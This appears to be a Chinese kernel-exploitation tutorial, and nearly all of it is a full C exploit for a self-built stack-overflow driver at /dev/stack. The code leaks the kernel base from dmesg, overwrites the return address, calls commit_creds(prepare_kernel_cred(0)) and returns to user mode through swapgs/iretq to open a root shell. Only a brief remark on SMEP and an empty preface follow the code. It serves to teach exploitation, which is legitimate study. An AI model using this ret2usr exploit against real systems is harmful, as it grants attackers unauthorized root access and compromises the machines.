
```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>
struct cred;
struct task\_struct;
typedef struct cred \*(\*prepare\_kernel\_cred\_t) (struct task\_struct \*daemon) \_\_attribute\_\_((regparm(3)));
typedef int (\*commit\_creds\_t) (struct cred \*new) \_\_attribute\_\_((regparm(3)));
prepare\_kernel\_cred\_t prepare\_kernel\_cred;
commit\_creds\_t commit\_creds;
unsigned long user\_cs;
unsigned long user\_ss;
unsigned long user\_rflags;
unsigned long stack;
unsigned long findAddr();
static void save\_state();
void getroot (void);
void shell(void);
int main(int argc, char \*argv[])
{
int fd;
unsigned char payload[300] = {0};
unsigned char \*p = payload;
unsigned long memOffset;
memOffset = findAddr();
unsigned long pop\_rax\_rbx\_r12\_rbp\_ret = memOffset - 0xCB5B47;
unsigned long movCr4Rax\_pop\_rbp = (unsigned long)memOffset-0x01020F1C;
unsigned long getR = (unsigned long)getroot;
unsigned long swapgs = (unsigned long)memOffset-0x7AAE78;
unsigned long iretq = (unsigned long)memOffset-0x7AC289;
unsigned long sh = (unsigned long)shell;
printf(" addr[0x%llx]\n", memOffset);
/\* set value for commit\_creds and prepare\_kernel\_cred \*/
commit\_creds = (commit\_creds\_t)(memOffset - 0xfbf6a0);
prepare\_kernel\_cred = (prepare\_kernel\_cred\_t)(memOffset - 0xfbf2e0);
/\* open fd on /dev/vuln \*/
printf("[+] Open vuln device...\n");
if ((fd = open("/dev/stack", O\_RDWR)) < 0) {
printf(" Can't open device file: /dev/stack\n");
exit(1);
}
/\* payload \*/
printf("[+] Construct the payload...\n");
save\_state();
/\* offset before RIP \*/
memcpy(p,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",116);
p+=116;
memcpy(p,"\x42\x42\x42\x42\x42\x42\x42\x42",8); /\* for rbp \*/
p+=8;
/\* getroot \*/
memcpy(p,&getR,8);
p+=8;
/\* swapgs;ret \*/
printf(" swapgs at 0x%lx\n", swapgs);
memcpy(p,&swapgs,8);
p+=8;
/\* iretq \*/
printf(" iretq at 0x%lx\n", iretq);
memcpy(p,&iretq,8);
p+=8;
/\*
the stack should look like this after an iretq call
RIP
CS
EFLAGS
RSP
SS
\*/
/\* shell \*/
memcpy(p,&sh,8);
p+=8;
/\* user\_cs \*/
memcpy(p,&user\_cs,8);
p+=8;
/\* user\_rflags \*/
memcpy(p,&user\_rflags,8);
p+=8;
/\*stack of userspace \*/
register unsigned long rsp asm("rsp");
unsigned long sp = (unsigned long)rsp;
memcpy(p,&sp,8);
p+=8;
/\* user\_ss \*/
memcpy(p,&user\_ss,8);
/\* trig the vuln \*/
printf("[+] Trig the vulnerablity...\n");
write(fd, payload, 300);
return 0;
}
unsigned long findAddr() {
char line[512];
char string[] = "Freeing SMP alternatives memory";
char found[17];
unsigned long addr=0;
/\* execute dmesg and place result in a file \*/
printf("[+] Excecute dmesg...\n");
system("dmesg > /tmp/dmesg");
/\* find: Freeing SMP alternatives memory \*/
printf("[+] Find usefull addr...\n");
FILE\* file = fopen("/tmp/dmesg", "r");
while (fgets(line, sizeof(line), file)) {
if(strstr(line,string)) {
strncpy(found,line+53,16);
sscanf(found,"%p",(void \*\*)&addr);
break;
}
}
fclose(file);
if(addr==0) {
printf(" dmesg error...\n");
exit(1);
}
return addr;
}
static void save\_state() {
asm(
"movq %%cs, %0\n"
"movq %%ss, %1\n"
"pushfq\n"
"popq %2\n"
: "=r" (user\_cs), "=r" (user\_ss), "=r" (user\_rflags) : : "memory" );
}
void shell(void) {
printf("[+] getuid() ...");
if(!getuid()) {
printf(" [root]\n[+] Enjoy your shell...\n");
system("/bin/sh");
} else {
printf("[+] not root\n[+] failed !!!\n");
}
}
/\* function to get root id \*/
void getroot (void)
{
commit\_creds(prepare\_kernel\_cred(0));
}
```

▲这里如果加了SMEP保护，那么就会出现下列的错误

```
unable to execute userspace code (SMEP?) (uid: 1000)
```

![image-20211004100138854](upload/attach/202111/904686\_GWC7AXXJVPPY93D.jpg)

# 前言

先尝试下最简单的栈溢出，保护和未被保护的情况

给出自己设计的栈溢出题目：

|  |  |

| --- | --- |
